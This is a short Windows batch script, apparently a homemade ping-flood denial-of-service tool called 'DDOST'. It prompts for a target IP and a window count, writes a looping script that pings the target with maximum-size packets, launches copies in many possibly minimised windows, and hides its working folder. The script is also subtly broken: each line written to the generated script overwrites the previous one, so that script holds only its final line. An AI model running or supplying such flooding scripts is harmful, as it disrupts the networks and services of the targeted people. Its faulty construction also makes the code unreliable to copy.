@echo off
  

if exist %userprofile%\key goto skip
  cls
  echo verifiedbypass>%userprofile%\key
  md %temp%\DDOST\
  md %userprofile%\.ddost\
  md %userprofile%\.ddost\data\
  attrib +h %temp%\DDOST\

:skip
  echo IP:
  set /p ip=
    cls
      echo Amount of windows:
  set /p windows=
    cls
      echo @echo off>"%temp%\DDOST\run.bat"
      echo :loop>"%temp%\DDOST\run.bat"
      echo if exist "%userprofile%\.ddost\data\exit.dat" exit>"%temp%\DDOST\run.bat"
      echo ping %ip% -n 1 -l 65500>"%temp%\DDOST\run.bat"
      echo goto loop>"%temp%\DDOST\run.bat"
      echo Minimize Windows (Y/N):
  set /p mintf=
    cls
      if "%mintf%"=="Y" set mintf=/min
      if "%mintf%"=="N" set mintf=

for /l %%A in (1,1,%windows%) do start %mintf% "cmd.exe" "%temp%\DDOST\run.bat"
echo Press any button to exit
  pause >nul
    del /q "%temp%\DDOST\run.bat"
    echo EXIT>%userprofile%\.ddost\data\exit.dat
    timeout /t 1
    del /q "%userprofile%\.ddost\data\exit.dat"
    exit
